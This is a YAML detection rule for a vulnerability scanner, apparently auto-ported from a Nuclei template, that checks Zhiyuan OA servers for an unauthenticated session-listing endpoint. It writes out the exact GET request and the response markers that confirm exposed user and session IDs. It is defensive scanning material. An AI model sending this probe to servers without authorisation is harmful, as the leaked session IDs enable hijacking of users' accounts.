schema_version: 1
id: "cortex.community:zhiyuan-oa-session-leak"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Zhiyuan OA Session Leak"
  description: "A vulnerability in Zhiyuan OA allows remote unauthenticated users access to sensitive session information via the 'getSessionList.jsp' endpoint. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.zhihuifly.com/t/topic/3345"
  tags: ["zhiyuan", "leak", "disclosure", "seeyon", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/yyoa/ext/https/getSessionList.jsp?cmd=getAll" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<usrID>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<sessionID>" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
